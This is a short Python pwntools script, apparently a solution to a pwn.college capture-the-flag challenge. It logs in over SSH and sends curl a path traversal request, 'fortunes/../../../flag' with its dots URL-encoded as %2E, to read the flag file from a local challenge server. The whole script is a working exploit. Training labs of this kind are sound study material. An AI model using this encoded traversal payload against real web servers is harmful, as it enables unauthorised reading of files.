#!/usr/bin/python3

from pwn import *
from urllib.parse import quote

context.log_level = 'error'

s = ssh(host="dojo.pwn.college",user="hacker",keyfile="../../key")
payload = "http://challenge.localhost/items/" + quote("fortunes/../../../flag",safe="").replace(".","%2E")
io = s.process(["curl",payload])
print(io.recvall().decode())

io.close()
